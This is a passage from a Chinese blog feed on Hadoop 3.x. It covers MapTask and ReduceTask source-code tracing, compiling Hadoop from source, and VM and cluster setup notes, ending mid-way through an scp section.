class="comment">//溢写排序，MapTask1505行，进入</span></span><br><span class="line">          sorter.sort()   QuickSort <span class="comment">//溢写排序方法，MapTask1625行，进入</span></span><br><span class="line">        mergeParts(); <span class="comment">//合并文件，MapTask1527行，进入</span></span><br><span class="line">      </span><br><span class="line">        collector.close(); <span class="comment">//MapTask739行,收集器关闭,即将进入ReduceTask</span></span><br><span class="line"><span class="comment">//ReduceTask源码解析流程</span></span><br><span class="line">=================== ReduceTask ===================</span><br><span class="line"><span class="keyword">if</span> (isMapOrReduce())  <span class="comment">//reduceTask324行，提前打断点</span></span><br><span class="line">initialize()   <span class="comment">// reduceTask333行,进入</span></span><br><span class="line">init(shuffleContext);  <span class="comment">// reduceTask375行,走到这需要先给下面的打断点</span></span><br><span class="line">        totalMaps = job.getNumMapTasks(); <span class="comment">// ShuffleSchedulerImpl第120行，提前打断点</span></span><br><span class="line">         merger = createMergeManager(context); <span class="comment">//合并方法，Shuffle第80行</span></span><br><span class="line">          <span class="comment">// MergeManagerImpl第232 235行，提前打断点</span></span><br><span class="line">          <span class="keyword">this</span>.inMemoryMerger = createInMemoryMerger(); <span class="comment">//内存合并</span></span><br><span class="line">          <span class="keyword">this</span>.onDiskMerger = <span class="keyword">new</span> OnDiskMerger(<span class="keyword">this</span>); <span class="comment">//磁盘合并</span></span><br><span class="line">        rIter = shuffleConsumerPlugin.run();</span><br><span class="line">            eventFetcher.start();  <span class="comment">//开始抓取数据，Shuffle第107行，提前打断点</span></span><br><span class="line">            eventFetcher.shutDown();  <span class="comment">//抓取结束，Shuffle第141行，提前打断点</span></span><br><span class="line">            copyPhase.complete();   <span class="comment">//copy阶段完成，Shuffle第151行</span></span><br><span class="line">            taskStatus.setPhase(TaskStatus.Phase.SORT);  <span class="comment">//开始排序阶段，Shuffle第152行</span></span><br><span class="line">          sortPhase.complete();   <span class="comment">//排序阶段完成，即将进入reduce阶段 reduceTask382行</span></span><br><span class="line">        reduce();  <span class="comment">//reduce阶段调用的就是我们自定义的reduce方法，会被调用多次</span></span><br><span class="line">          cleanup(context); <span class="comment">//reduce完成之前，会最后调用一次Reducer里面的cleanup方法</span></span><br></pre></td></tr></table></figure><h1>七、Hadoop源码编译</h1><h2 id="1、环境准备">1、环境准备</h2><blockquote><p>源码地址：<a href="https://hadoop.apache.org/release/3.1.3.html" target="_blank" rel="noopener" title="https://hadoop.apache.org/release/3.1.3.html">https://hadoop.apache.org/release/3.1.3.html</a></p></blockquote><p>具体可以看build.txt文件，修改源码中的HDFS副本数的设置</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335079.png" alt></p><p>回到Centos系统，Jar包准备（Hadoop源码、JDK8、Maven、Ant 、Protobuf）</p><ul><li>hadoop-3.1.3-src.tar.gz</li><li>jdk-8u212-linux-x64.tar.gz</li><li>apache-maven-3.6.3-bin.tar.gz</li><li>protobuf-2.5.0.tar.gz（序列化的框架）</li><li>cmake-3.17.0.tar.gz</li></ul><h2 id="2、工具包安装">2、工具包安装</h2><p>注意：所有操作必须在root用户下完成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 分别创建/opt/software/hadoop_source和/opt/module/hadoop_source路径</span></span><br><span class="line"><span class="comment"># 上传软件包到指定的目录，例如 /opt/software/hadoop_source</span></span><br><span class="line"><span class="comment"># 解压软件包指定的目录，例如： /opt/module/hadoop_source</span></span><br><span class="line">tar -zxvf apache-maven-3.6.3-bin.tar.gz -C  /opt/module/hadoop_source/</span><br><span class="line">tar -zxvf cmake-3.17.0.tar.gz -C  /opt/module/hadoop_source/</span><br><span class="line">tar -zxvf hadoop-3.1.3-src.tar.gz -C  /opt/module/hadoop_source/</span><br><span class="line">tar -zxvf protobuf-2.5.0.tar.gz -C  /opt/module/hadoop_source/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装JDK</span></span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/hadoop_source/</span><br><span class="line">vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 输入如下内容：</span></span><br><span class="line"><span class="comment">#JAVA_HOME</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/hadoop_source/jdk1.8.0_212</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新JDK环境变量</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">java -version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置maven环境变量，maven镜像，并验证</span></span><br><span class="line">vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment">#MAVEN_HOME</span></span><br><span class="line">MAVEN_HOME=/opt/module/hadoop_source/apache-maven-3.6.3</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$MAVEN_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 修改maven的镜像</span></span><br><span class="line">vi conf/settings.xml</span><br><span class="line"><span class="comment"># 在 mirrors节点中添加阿里云镜像</span></span><br><span class="line">&lt;mirrors&gt;</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">         &lt;id&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">         &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">         &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">              &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">&lt;/mirrors&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证maven安装是否成功</span></span><br><span class="line">mvn -version </span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装相关的依赖(注意安装顺序不可乱，可能会出现依赖找不到问题)</span></span><br><span class="line"><span class="comment"># 安装gcc make</span></span><br><span class="line">yum install -y gcc* make</span><br><span class="line"><span class="comment"># 安装压缩工具</span></span><br><span class="line">yum -y install snappy*  bzip2* lzo* zlib*  lz4* gzip*</span><br><span class="line"><span class="comment"># 安装一些基本工具</span></span><br><span class="line">yum -y install openssl* svn ncurses* autoconf automake libtool</span><br><span class="line"><span class="comment"># 安装扩展源，才可安装zstd</span></span><br><span class="line">yum -y install epel-release</span><br><span class="line"><span class="comment"># 安装zstd</span></span><br><span class="line">yum -y install *zstd*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动安装cmake</span></span><br><span class="line"><span class="comment"># 在解压好的cmake目录下，执行./bootstrap进行编译，此过程需一小时请耐心等待</span></span><br><span class="line">./bootstrap</span><br><span class="line"><span class="comment"># 执行安装</span></span><br><span class="line">make &amp;&amp; make install </span><br><span class="line">cmake -version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装protobuf，进入到解压后的protobuf目录 </span></span><br><span class="line"><span class="comment"># 依次执行下列命令 --prefix 指定安装到当前目录</span></span><br><span class="line">./configure --prefix=/opt/module/hadoop_source/protobuf-2.5.0</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 输入如下内容</span></span><br><span class="line">PROTOC_HOME=/opt/module/hadoop_source/protobuf-2.5.0</span><br><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$MAVEN_HOME</span>/bin:<span class="variable">$PROTOC_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line">protoc --version</span><br></pre></td></tr></table></figure><h2 id="3、编译源码">3、编译源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入解压后的Hadoop源码目录下</span></span><br><span class="line"><span class="comment">#开始编译</span></span><br><span class="line">mvn clean package -DskipTests -Pdist,native -Dtar</span><br><span class="line"><span class="comment"># 注意：第一次编译需要下载很多依赖jar包，编译时间会很久，预计1小时左右，最终成功是全部SUCCESS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 成功的64位hadoop包在/opt/module/hadoop_source/hadoop-3.1.3-src/hadoop-dist/target下</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1&gt;Hadoop3.x源码解析&lt;/h1&gt;
&lt;h1&gt;一、RPC通信原理解析&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;http://qnypic.shawncoding.top/blog/202401251335067.png&quot; alt&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
    
    <category term="大数据" scheme="https://blog.shawncoding.top/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"/>
    
  </entry>
  
  <entry>
    <title>Hadoop3.x学习笔记</title>
    <link href="https://blog.shawncoding.top/posts/6f0694e3.html"/>
    <id>https://blog.shawncoding.top/posts/6f0694e3.html</id>
    <published>2024-02-06T07:03:43.000Z</published>
    <updated>2024-02-29T12:00:08.279Z</updated>
    
    <content type="html"><![CDATA[<h1>一、Hadoop入门</h1><h2 id="1、Hadoop概述">1、Hadoop概述</h2><h3 id="1-1-简介">1.1 简介</h3><p>Hadoop是一个由Apache基金会所开发的分布式系统基础架构。主要解决海量数据的存储和海量数据的分析计算问题。广义上来说，Hadoop通常是指一个更广泛的概念——Hadoop生态圈。</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330896.jpg" alt></p><p>官网地址：<a href="http://hadoop.apache.org" target="_blank" rel="noopener" title="http://hadoop.apache.org">http://hadoop.apache.org</a></p><p>下载地址：<a href="https://hadoop.apache.org/releases.html" target="_blank" rel="noopener" title="https://hadoop.apache.org/releases.html">https://hadoop.apache.org/releases.html</a></p><a id="more"></a><h3 id="1-2-hadoop优势">1.2 hadoop优势</h3><ul><li>高可靠：Hadoop底层维护多个数据副本，所以即使Hadoop某个计算元素或存储出现故障，也不会导致数据的丢失</li><li>高扩展性：在集群间分配任务数据,可方便的扩展数以千计的节点</li><li>高效性：在MapReduce的思想下，Hadoop是并行工作的，以加快任务处<br>理速度</li><li>高容错性：能够自动将失败的任务重新分配</li></ul><h3 id="1-3-hadoop组成">1.3 hadoop组成</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330897.png" alt></p><p><strong>1)HDFS架构概述</strong></p><p>Hadoop Distributed File System，简称HDFS，是一个<strong>分布式文件系统</strong></p><ul><li>NameNode（NN）：存储文件的<strong>元数据</strong>，如文件名、文件目录结构、文件属性，以及每个文件的块列表和块所在的DataNode等</li><li>DataNode（DN）：在本地文件系统<strong>存储文件块数据</strong>，以及<strong>块数据的校验和</strong></li><li>Secondary NameNode（2NN）：每隔一段时间对NameNode<strong>元数据备份</strong></li></ul><p><strong>2)YARN 架构概述</strong></p><p>YARN（Yet Another Resource Negotiater）：另一种资源协调者，是Hadoop的资源管理器</p><p><img src="http://qnypic.shawncoding.top/blog/202401251330898.png" alt></p><p><strong>3)MapReduce架构概述</strong></p><p>MapReduce将计算过程分为两个阶段：Map和Reduce</p><ul><li>Map阶段并行处理输入数据</li><li>Reduce阶段对Map结果进行汇总</li></ul><p><strong>4)HDFS、YARN、MapReduce三者关系</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330899.png" alt></p><h3 id="1-4-大数据技术生态体系">1.4 大数据技术生态体系</h3><ul><li>Sqoop：Sqoop是一款开源的工具，主要用于在Hadoop、Hive与传统的数据库（MySQL）间进行数据的传递，可以将一个关系型数据库（例如 ：MySQL，Oracle 等）中的数据导进到Hadoop的HDFS中，也可以将HDFS的数据导进到关系型数据库中</li><li>Flume：Flume是一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统，Flume支持在日志系统中定制各类数据发送方，用于收集数据；</li><li>Kafka：Kafka是一种高吞吐量的分布式发布订阅消息系统； </li><li>Spark：Spark是当前最流行的开源大数据内存计算框架。可以基于Hadoop上存储的大数据进行计算</li><li>Flink：Flink是当前最流行的开源大数据内存计算框架。用于实时计算的场景较多</li><li>Oozie：Oozie是一个管理Hadoop作业（job）的工作流程调度管理系统</li><li>Hbase：HBase是一个分布式的、面向列的开源数据库。HBase不同于一般的关系数据库，它是一个适合于非结构化数据存储的数据库</li><li>Hive：Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的SQL查询功能，可以将SQL语句转换为MapReduce任务进行运行。其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用，十分适合数据仓库的统计分析</li><li>ZooKeeper：它是一个针对大型分布式系统的可靠协调系统，提供的功能包括：配置维护、名字服务、分布式同步、组服务等</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251330900.png" alt></p><h2 id="2、环境准备-重点">2、环境准备(重点)</h2><h3 id="2-1-模板机配置">2.1 模板机配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装模板虚拟机，IP地址192.168.10.100、主机名称hadoop100、内存4G、硬盘50G</span></span><br><span class="line"><span class="comment"># 具体安装不介绍了，可以VMware也可以pve进行安装，系统可以选择最小安装或者带图形安装</span></span><br><span class="line"><span class="comment"># 使用yum安装需要虚拟机可以正常上网，yum安装前可以先测试下虚拟机联网情况</span></span><br><span class="line">ping www.baidu.com</span><br><span class="line"><span class="comment"># 安装epel-release</span></span><br><span class="line"><span class="comment"># 注：Extra Packages for Enterprise Linux是为“红帽系”的操作系统提供额外的软件包，适用于RHEL、CentOS和Scientific Linux。相当于是一个软件仓库，大多数rpm包在官方 repository 中是找不到的</span></span><br><span class="line">yum install -y epel-release</span><br><span class="line"><span class="comment"># 如果Linux安装的是最小系统版，还需要安装如下工具；如果安装的是Linux桌面标准版，不需要执行如下操作</span></span><br><span class="line"><span class="comment"># net-tool：工具包集合，包含ifconfig等命令</span></span><br><span class="line">yum install -y net-tools </span><br><span class="line">yum install -y vim</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭防火墙，关闭防火墙开机自启</span></span><br><span class="line"><span class="comment"># 注意：在企业开发时，通常单个服务器的防火墙时关闭的。公司整体对外会设置非常安全的防火墙</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建atguigu用户，并修改atguigu用户的密码</span></span><br><span class="line">useradd atguigu</span><br><span class="line">passwd atguigu</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置atguigu用户具有root权限，方便后期加sudo执行root权限的命令</span></span><br><span class="line">vim /etc/sudoers</span><br><span class="line"><span class="comment"># 修改/etc/sudoers文件，在%wheel这行下面添加一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Allow root to run any commands anywhere</span></span><br><span class="line">root ALL=(ALL) ALL</span><br><span class="line"><span class="comment">## Allows people in group wheel to run all commands</span></span><br><span class="line">%wheel ALL=(ALL) ALL</span><br><span class="line">atguigu ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="comment"># 注意：atguigu 这一行不要直接放到 root 行下面，因为所有用户都属于 wheel 组，你先配置了 atguigu 具有免密功能，但是程序执行到%wheel 行时，该功能又被覆盖回需要密码。所以 atguigu 要放到%wheel 这行下面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在/opt 目录下创建文件夹，并修改所属主和所属组,查看权限</span></span><br><span class="line">mkdir /opt/module</span><br><span class="line">mkdir /opt/software</span><br><span class="line">chown atguigu:atguigu /opt/module </span><br><span class="line">chown atguigu:atguigu /opt/software</span><br><span class="line">ll /opt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载虚拟机自带的 JDK</span></span><br><span class="line"><span class="comment"># 如果你的虚拟机是最小化安装不需要执行这一步</span></span><br><span class="line">rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="comment"># rpm -qa：查询所安装的所有rpm软件包</span></span><br><span class="line"><span class="comment"># grep -i：忽略大小写</span></span><br><span class="line"><span class="comment"># xargs -n1：表示每次只传递一个参数</span></span><br><span class="line"><span class="comment"># rpm -e –nodeps：强制卸载软件</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>另外还需要配置网卡信息和主机名，这样更容易管理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先找到自己的网卡，可能不同机器不一样，比如我的就是eth0</span></span><br><span class="line">ip a</span><br><span class="line"><span class="comment"># 修改克隆虚拟机的静态 IP，动态也可以只是不好管理</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0</span><br><span class="line"><span class="comment"># 改成下面，根据实际情况自己选取</span></span><br><span class="line">ONBOOT=yes</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">NAME=<span class="string">"eth0"</span></span><br><span class="line">IPADDR=192.168.31.210</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.31.1</span><br><span class="line">DNS1=192.168.31.1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改主机名,模板机就设置为Hadoop100</span></span><br><span class="line">vim /etc/hostname</span><br><span class="line"><span class="comment"># 配置 Linux 克隆机主机名称映射 hosts 文件,后期直接可以通过名字访问了</span></span><br><span class="line">vim /etc/hosts</span><br><span class="line">192.168.31.210 hadoop100</span><br><span class="line">192.168.31.211 hadoop101</span><br><span class="line">192.168.31.212 hadoop102</span><br><span class="line">192.168.31.213 hadoop103</span><br><span class="line">192.168.31.214 hadoop104</span><br><span class="line"><span class="comment"># 最后也可以将windows 的主机映射文件（hosts 文件）修改，在C:\Windows\System32\drivers\etc</span></span><br></pre></td></tr></table></figure><h3 id="2-2-模板创建">2.2 模板创建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆hadoop100机器，打开后修改IP地址和hostname，重启</span></span><br><span class="line"><span class="comment"># ===================== 安装JDK8=========================</span></span><br><span class="line"><span class="comment"># 官网下载 https://www.oracle.com/java/technologies/downloads/</span></span><br><span class="line"><span class="comment"># 把文件上传到该目录i</span></span><br><span class="line">ls /opt/software/</span><br><span class="line"><span class="comment"># 解压到指定目录</span></span><br><span class="line">tar -zxvf jdk-8u121-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="comment"># 看一下全局加载的配置文件(环境便利)</span></span><br><span class="line">cat /etc/profile</span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 写入以下环境</span></span><br><span class="line"><span class="comment">#JAVA_HOME</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/module/jdk1.8.0_121</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新环境变量</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">java -version</span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================安装hadoop==================</span></span><br><span class="line"><span class="comment"># 官网 https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/</span></span><br><span class="line">wget https://archive.apache.org/dist/hadoop/common/hadoop-3.1.3/hadoop-3.1.3.tar.gz</span><br><span class="line">tar -zxvf hadoop-3.1.3.tar.gz -C /opt/module/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为什么是把环境变量放在/etc/profile.d下呢？</span></span><br><span class="line"><span class="comment"># 如果正常登陆，是Login shell，会加载/etc/profile、~/.bash_profile、~/.bashrc-&gt;/etc/bashrc-&gt;/etc/profile.d/*.sh</span></span><br><span class="line"><span class="comment"># 如果是ssh登陆,是non-login shell，只会加载~/.bashrc-&gt;/etc/bashrc-&gt;/etc/profile.d/*.sh</span></span><br><span class="line">sudo vim /etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 继续添加环境变量</span></span><br><span class="line"><span class="comment">#HADOOP_HOME</span></span><br><span class="line"><span class="built_in">export</span> HADOOP_HOME=/opt/module/hadoop-3.1.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HADOOP_HOME</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$HADOOP_HOME</span>/sbin</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 测试，如果hadoop命令失效可以重启试试看</span></span><br><span class="line">hadoop version</span><br><span class="line"></span><br><span class="line"><span class="comment"># hadoop相关目录介绍</span></span><br><span class="line"><span class="comment"># bin目录：存放对Hadoop相关服务（hdfs，yarn，mapred）进行操作的脚本</span></span><br><span class="line"><span class="comment"># etc目录：Hadoop的配置文件目录，存放Hadoop的配置文件</span></span><br><span class="line"><span class="comment"># lib目录：存放Hadoop的本地库（对数据进行压缩解压缩功能）</span></span><br><span class="line"><span class="comment"># sbin目录：存放启动或停止Hadoop相关服务的脚本</span></span><br><span class="line"><span class="comment"># share目录：存放Hadoop的依赖jar包、文档、和官方案例</span></span><br></pre></td></tr></table></figure><h2 id="3、本地运行模式（官方WordCount）">3、本地运行模式（官方WordCount）</h2><blockquote><p>官网：<a href="http://hadoop.apache.org/" target="_blank" rel="noopener" title="http://hadoop.apache.org/">http://hadoop.apache.org/</a></p></blockquote><p>Hadoop运行模式包括：<strong>本地模式</strong>、<strong>伪分布式模式</strong>以及<strong>完全分布式模式</strong>。</p><ul><li><strong>本地模式</strong>：单机运行，只是用来演示一下官方案例。生产环境不用。</li><li>**伪分布式模式：**也是单机运行，但是具备Hadoop集群的所有功能，一台服务器模拟一个分布式的环境。个别缺钱的公司用来测试，生产环境不用。</li><li>**完全分布式模式：**多台服务器组成分布式环境。生产环境使用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/module/hadoop-3.1.3/</span><br><span class="line">mkdir wcinput</span><br><span class="line">vim word.txt</span><br><span class="line"><span class="comment"># 在文件中输入如下内容</span></span><br><span class="line">hadoop yarn</span><br><span class="line">hadoop mapreduce</span><br><span class="line">atguigu</span><br><span class="line">atguigu shawn</span><br><span class="line"><span class="comment"># 返回目录</span></span><br><span class="line"><span class="built_in">cd</span> /opt/module/hadoop-3.1.3</span><br><span class="line"><span class="comment"># 执行，统计每个单词数</span></span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount wcinput wcoutput</span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">cat wcoutput/part-r-00000</span><br></pre></td></tr></table></figure><h2 id="4、Hadoop集群搭建-🌟重点">4、Hadoop集群搭建(🌟重点)</h2><h3 id="4-1-环境准备-集群分发脚本xsync">4.1 环境准备(集群分发脚本xsync)</h3><p>首先准备三台机器，我这里准备hadoop102,103,104，配置好相关hostname和ip，接下来复制相关软件和配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =====================scp（secure copy）安全拷贝======================</span></span><br><span class="line"><span class="comment"># scp可以实现服务器与服务器之间的数据拷贝</span></span><br><span class="line"><span class="comment"># 基本语法：scp -r $pdir/$fname  $user@$host:$pdir/$fname</span></span><br><span class="line"><span class="comment"># 